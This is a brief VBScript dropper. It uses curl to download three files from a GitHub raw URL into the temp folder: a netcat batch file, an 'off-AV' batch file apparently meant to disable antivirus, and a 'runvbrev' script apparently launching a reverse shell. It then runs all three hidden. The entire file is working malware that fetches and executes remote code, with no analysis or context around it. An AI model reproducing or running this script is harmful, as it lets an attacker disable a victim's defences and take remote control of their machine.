Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "curl https://raw.githubusercontent.com/wolfyy59/wfy/master/netcat.bat --output %TEMP%/netcat.bat", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "curl https://raw.githubusercontent.com/wolfyy59/wfy/master/off-AV.bat --output %TEMP%/off-AV.bat", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "curl https://raw.githubusercontent.com/wolfyy59/wfy/master/runvbrev.vbs --output %TEMP%/runvbrev.vbs", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min %TEMP%/netcat.bat", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min %TEMP%/off-AV.bat", 0, True
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c start /min %TEMP%/runvbrev.vbs", 0, True






































